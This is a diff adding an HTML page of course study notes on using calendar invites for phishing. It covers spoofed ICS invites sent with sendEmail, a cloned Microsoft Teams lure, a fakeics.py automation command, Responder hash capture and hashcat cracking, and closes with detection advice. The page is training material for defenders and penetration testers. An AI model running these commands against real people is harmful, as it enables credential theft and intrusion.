@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="es" data-nz-theme="light" data-nz-marca="monocromo">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PEN-300 Module 05 — Phishing with Calendars (ICS invites as an initial access vector) — distill</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/tokens.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/marcas/monocromo.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p1-layout.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p2-navigation.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p3-typography.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p4-actions.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p6-feedback.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p8-data.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Ntizar/Aurora@v10/packs/p17-patrones.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script>
+const mq = matchMedia('(prefers-color-scheme: dark)');
+const saved = localStorage.getItem('nz-theme');
+if (saved === 'dark' || saved === 'light') document.documentElement.dataset.nzTheme = saved;
+else if (mq.matches) document.documentElement.dataset.nzTheme = 'dark';
+mq.addEventListener('change', e => {
+  if (!localStorage.getItem('nz-theme')) document.documentElement.dataset.nzTheme = e.matches ? 'dark' : 'light';
+});
+function nzToggleTheme() {
+  const cur = document.documentElement.dataset.nzTheme === 'dark' ? 'light' : 'dark';
+  document.documentElement.dataset.nzTheme = cur;
+  localStorage.setItem('nz-theme', cur);
+  if (window.nzAfterTheme) nzAfterTheme();
+}
+mermaid.initialize({ startOnLoad: false });
+mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+window.nzAfterTheme = async () => {
+  document.querySelectorAll('.mermaid').forEach(el => {
+    const code = el.getAttribute('data-src') || el.textContent;
+    el.setAttribute('data-src', code);
+    el.removeAttribute('data-processed');
+    el.textContent = code;
+  });
+  mermaid.initialize({ startOnLoad: false, theme: document.documentElement.dataset.nzTheme === 'dark' ? 'dark' : 'neutral' });
+  await mermaid.run({ querySelector: '.mermaid' });
+};
+document.addEventListener('DOMContentLoaded', () => {
+  if (document.querySelector('.mermaid')) mermaid.run({ querySelector: '.mermaid' });
+});
+</script>
+<style>
+.nz-prose pre.mermaid { background: none; text-align: center; }
+</style>
+</head>
+<body class="nz">
+<div class="nz-navbar nz-navbar--compact nz-navbar--bordered">
+<span class="nz-navbar__brand"><i></i>Distill</span>
+<span class="nz-navbar__links">
+<a class="nz-navbar__link" href="../../index.html">Índice</a>
+<a class="nz-navbar__link" href="../osep.html">OSEP (PEN-300)</a>
+<button class="nz-btn nz-btn--ghost nz-btn--sm" onclick="nzToggleTheme()" aria-label="Cambiar tema">◐</button>
+</span>
+</div>
+<main class="nz-container" style="padding-block: var(--nz-space-4)">
+<article class="nz-article">
+<header style="margin-bottom:var(--nz-space-4)">
+<p class="nz-eyebrow">Distill · OSEP (PEN-300)</p>
+<h1 class="nz-h2">PEN-300 Module 05 — Phishing with Calendars (ICS invites as an initial access vector)</h1>
+<p class="nz-lbl nz-lbl--neutral">Fuente: material del curso correspondiente (sin video público)</p>
+</header>
+<div class="nz-prose">
+<h2>Objective</h2>
+<p>Weaponize the iCalendar (ICS) standard — T1566 (Phishing) in the MITRE ATT&amp;CK framework — as an initial access vector. Calendar invites routinely sail past email filters and lower user skepticism because they look like legitimate scheduling traffic. The module's full attack chain:</p>
+<ol>
+<li>Understand the ICS file structure (RFC 5545) and which fields adversaries manipulate.</li>
+<li>Craft a custom ICS invite + HTML email body and send it with <code>sendEmail</code>.</li>
+<li>Upgrade the phish by cloning a genuine Microsoft Teams invitation, then automate the whole pipeline with a Python script (<code>fakeics.py</code>, inspired by <em>FakeMeeting</em>).</li>
+<li>Weaponize the link with Responder: capture the victim's NetNTLMv2 hash via a fake HTTP auth prompt and crack it with Hashcat.</li>
+</ol>
+<h2>Target surface</h2>
+<ul>
+<li>Kali attacker machine (<code>kali</code>), SMTP server <code>mail01</code> at <code>192.168.50.121</code>.</li>
+<li>Victim: Windows client <code>client01</code> at <code>192.168.50.120</code> (Thunderbird mail client), user <code>offsec@corp1.com</code> in the <code>CORP1</code> domain.</li>
+<li>Kali's lab VPN interface for the listener: <code>tun0</code> (<code>192.168.251.151</code>).</li>
+<li>Attack URL used in the automated campaign: <code>http://192.168.251.151</code>.</li>
+<li>Credentials in lab output (NetNTLMv2 hash blob, cracked password) are <strong>[REDACTED]</strong> — see Techniques §4 for the exact hashcat invocation shape.</li>
+</ul>
+<h2>Techniques</h2>
+<h3>1. ICS fundamentals — fields adversaries manipulate</h3>
+<p>An ICS file is plain text per <strong>RFC 5545</strong>: header (<code>VERSION</code>, <code>METHOD</code>), then components — <code>VEVENT</code> (events), <code>VTODO</code>, <code>VJOURNAL</code> — each a set of key-value properties, one per line.</p>
+<p>The fields the course calls out:</p>
+<ul>
+<li><strong><code>ORGANIZER;CN="John Doe":mailto:johndoe@example.com</code></strong> — who the event appears to come from; set it to a trusted internal name/address.</li>
+<li><strong><code>DTSTART;TZID=America/New_York:20231015T090000</code> / <code>DTEND</code></strong> — event window; attackers pick typical business hours for legitimacy. Include <code>TZID</code> to avoid cross-timezone confusion.</li>
+<li><strong><code>DESCRIPTION</code></strong> — free text; the classic drop point for phishing links or malware instructions.</li>
+<li><strong><code>UID</code></strong> — unique event identifier; the course notes it helps the invite appear as a distinct calendar entry and evade filters — generate a random value at runtime.</li>
+</ul>
+<h3>2. First custom invite (sendEmail)</h3>
+<p>ICS template: a <code>VCALENDAR</code> with <code>PRODID:Microsoft Exchange Server 2022</code>, <code>METHOD:REQUEST</code>, a <code>VTIMEZONE</code> block (UTC), and a <code>VEVENT</code> carrying <code>DTSTART</code>/<code>DTEND</code>, <code>ORGANIZER;CN=Peter:mailto:peter@corp1.com</code>, <code>DESCRIPTION:http://meeting.corp1.com</code>, <code>LOCATION:Microsoft Teams Meeting</code>, <code>SUMMARY:HR meeting</code>, <code>STATUS:CONFIRMED</code>.</p>
+<p>HTML body template (<code>template.html</code>), then one sendEmail invocation:</p>
+<pre><code class="language-bash">sendEmail -s 192.168.50.121 \
+  -t offsec@corp1.com -f attacker@corp1.com \
+  -u &quot;test&quot; \
+  -o message-content-type=html -o message-file=./template.html \
+  -a iCalendar.ics
+</code></pre>
+<p>Verify on <code>client01</code> in Thunderbird (cloud-with-down-arrow icon fetches new mail). The invite renders correctly — but at this stage it's just a test email.</p>
+<h3>3. Crafting the full Teams-lookalike phish</h3>
+<p>Clone the HTML of a genuine Microsoft Teams invitation and swap every <code>href</code> for a <code>[ATTACKER_URL]</code> placeholder (replace it, brackets included, with the Kali IP): the copy keeps Segoe UI styling, "Click here to join the meeting", "Learn More", "Meeting options" — all pointing at the attacker.</p>
+<p>Send the enhanced version with subject "Urgent HR meeting". The result closely resembles the real notification.</p>
+<blockquote>
+<p><strong>Course Info box:</strong> in a real campaign the link target would be a <strong>typosquatted</strong> domain we control — mimic the target's real domain by changing/adding/removing characters ("1" for "l", "0" for "o", slight spelling variants) so recipients don't notice.</p>
+</blockquote>
+<h3>4. Automating: <code>fakeics.py</code></h3>
+<p>Two flexible templates with placeholders:</p>
+<ul>
+<li><code>email_template.html</code> — Teams layout with <code>{EVENT_TEXT}</code> (customizable context paragraph) and <code>{EVENT_URL}</code> (the phishing link behind "Click here to join the meeting").</li>
+<li><code>iCalendar_template.ics</code> — <code>{DTSTART}</code>/<code>{DTEND}</code>/<code>{DTSTAMP}</code>, <code>{ORGANIZER_NAME}</code> (static, e.g. "HR Team Corp1") / <code>{ORGANIZER_EMAIL}</code> (dynamic = sender), <code>{DESCRIPTION}</code> = phishing URL, <code>{SUMMARY}</code>, <code>{ATTENDEES}</code> = output of <code>generate_attendees()</code> (CEO/CTO addresses listed as <code>PARTSTAT=ACCEPTED</code> participants for credibility). The template also embeds a base64 <code>ATTACH</code> line — an artifact worth noting: any binary content in an ICS attach field is an extraction/red-flag detail to check in real invites.</li>
+</ul>
+<p>Script flow: load both templates → <code>prepare_template()</code> / <code>prepare_ics()</code> fill placeholders → compute UTC timestamps (meeting start back-dated 5 minutes, one-hour duration) → build a <code>MIMEMultipart('mixed')</code> message with the HTML part, a <code>text/calendar;method=REQUEST</code> part, and the <code>.ics</code> as base64 attachment → SMTP on port 25.</p>
+<pre><code class="language-bash">python3 fakeics.py 192.168.50.121 hr@corp1.com offsec@corp1.com http://192.168.251.151
+</code></pre>
+<p>Outcome on <code>client01</code>: phishing URLs embedded both in the email body <strong>and</strong> in the ICS <code>DESCRIPTION</code> field. Nothing is behind the link yet — that's the next step.</p>
+<h3>5. Credential stealing with Responder</h3>
+<p>Responder poisons name resolution (LLMNR, NBT-NS, mDNS — plus DNS; DHCP poisoning is OFF by default) and runs fake HTTP/SMB servers. When the victim clicks the "meeting" link, Responder answers with a fake <strong>Windows Security</strong>-style login prompt instead of a real page.</p>
+<pre><code class="language-bash">sudo responder -I tun0
+# ... Poisoners: LLMNR/NBT-NS/MDNS/DNS [ON]; HTTP+HTTPS servers [ON]; Listening for events...
+</code></pre>
+<p>Re-send the phish (<code>python3 fakeics.py ...</code>), click the link as the victim, enter credentials → Responder logs:</p>
+<pre><code>[HTTP] NTLMv2 Client   : 192.168.50.120
+[HTTP] NTLMv2 Username : CORP1\offsec
+[HTTP] NTLMv2 Hash     : &lt;REDACTED NetNTLMv2 blob&gt;
+</code></pre>
+<p>Save the full hash line as <code>hash.txt</code> and crack:</p>
+<pre><code class="language-bash">hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><code>-m 5600</code> = <strong>NetNTLMv2</strong> (the course text mislabels it "Double MD5" in prose — the hashcat output itself prints <code>Hash.Mode........: 5600 (NetNTLMv2)</code>; trust the output). Cracked on CPU at ~2.5 MH/s; recovered plaintext was <strong>[REDACTED]</strong>. Resulting creds are usable for initial access or lateral movement.</p>
+<h2>Extraction artifacts / notes</h2>
+<ul>
+<li>The HTML extraction duplicates the same "Listing 18" caption twice (credential capture + hashcat run) — caption numbering is off, content is fine.</li>
+<li>The <code>generate_attendees()</code> listing shows ICS folded-line continuation (leading-space lines after <code>\r\n</code>) mangled across line breaks by the extractor; in a real ICS file the folding is one logical line.</li>
+<li>Course prose labels <code>-m 5600</code> as "Double MD5" — wrong; it's NetNTLMv2 per hashcat's own output.</li>
+<li>Two different NTLMv2 hash blobs appear ( Listings in §5) — same victim, different challenge values per capture attempt. Both redacted here.</li>
+<li>The embedded ICS <code>ATTACH</code> base64 line in the template (<code>start cmd.exe</code>-style payload) is quoted verbatim by the course as part of the template; treat its presence as a detection signal, not a working payload.</li>
+</ul>
+<h2>Detection &amp; defense</h2>
+<ul>
+<li><strong>Calendar invites as phish</strong>: mail security often trusts calendar/ICS attachments; inspect ICS attachments for links in <code>DESCRIPTION</code>/<code>ATTACH</code>, random-looking <code>UID</code>s, and external organizers. Gate auto-adding invites.</li>
+<li><strong>Teams-lookalike HTML</strong>: pixel-cloned legitimate templates defeat visual inspection — users must verify the link target, not the layout; typosquatting means even the domain "looks right". Register lookalike domains defensively.</li>
+<li><strong>Responder</strong>: LLMNR/NBT-NS/mDNS poisoning is the enabler of the fake auth prompt — disable these protocols via group policy (or block with NAC) so name-resolution interception fails.</li>
+<li><strong>NetNTLMv2 exposure</strong>: captured hashes are crackable offline with <code>hashcat -m 5600</code>; enforce strong/long passwords to raise offline-crack cost, and prefer Kerberos-only auth where possible.</li>
+<li><strong>User reporting</strong>: the "urgent HR meeting" pressure framing is the social lever; report-fake-invite workflows shorten the window between click and response.</li>
+</ul>
+</div>
+<footer class="nz-callout" style="margin-top:var(--nz-space-5)">
+<p class="nz-lbl">Atribución</p>
+<p>Artículo destilado en español a partir de material del curso correspondiente. El análisis y la redacción son propios; las ideas y los datos presentados corresponden a los autores originales.</p>
+</footer>
+</article>
+</main>
+</body>
+</html>
